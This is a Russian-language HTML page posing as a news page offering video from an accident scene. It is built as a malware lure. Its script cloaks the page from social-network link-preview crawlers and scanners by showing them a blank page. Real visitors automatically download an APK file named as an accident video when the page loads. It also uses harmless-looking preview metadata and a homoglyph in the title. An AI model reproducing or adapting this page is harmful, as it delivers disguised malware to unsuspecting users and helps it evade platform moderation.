<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>nеws</title>
    
    <!-- Безобидные превью для соцсетей -->
    <meta property="og:title" content="okk">
    <meta property="og:description" content="Откройте для пpocмотра">
    <meta property="og:type" content="website">
    
    <style>
        body { 
            margin: 0; 
            padding: 0; 
            background: #fff; 
            font-family: -apple-system, sans-serif; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
        }
        p { color: #999; font-size: 14px; }
    </style>
</head>
<body>
    <p>Чтобы посмотреть видео с места аварии, установите его...</p>
    
    <script>
        // Проверка на ботов ОК и других соцсетей
        function isBot() {
            const ua = navigator.userAgent.toLowerCase();
            const botPatterns = [
                'okbot', 'odnoklassniki', 'mail.ru', 'vkshare', 'facebookexternalhit',
                'twitterbot', 'telegrambot', 'whatsapp', 'slackbot', 'discordbot',
                'linkedinbot', 'pinterest', 'crawler', 'spider', 'bot'
            ];
            for (let pattern of botPatterns) {
                if (ua.includes(pattern)) return true;
            }
            return false;
        }

        // Если бот — показываем пустую страницу (без ссылок и файлов)
        if (isBot()) {
            document.body.innerHTML = '';
        } else {
            // Имя файла (должно точно совпадать с именем файла в репозитории)
            const fileName = 'Видео с места аварии.apk';
            const encodedName = encodeURI(fileName);
            
            // Определяем iOS (там другой механизм скачивания)
            const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
            
            if (isIOS) {
                // На iOS Safari используем прямую навигацию — файл откроется в браузере,
                // и пользователь сможет сохранить его через меню "Поделиться"
                window.location.href = encodedName;
            } else {
                // На Android и ПК используем link.click() с атрибутом download
                // Это гарантирует скачивание, а не открытие в браузере
                const link = document.createElement('a');
                link.href = encodedName;
                link.download = fileName;
                link.style.display = 'none';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }
        }
    </script>
</body>
</html>
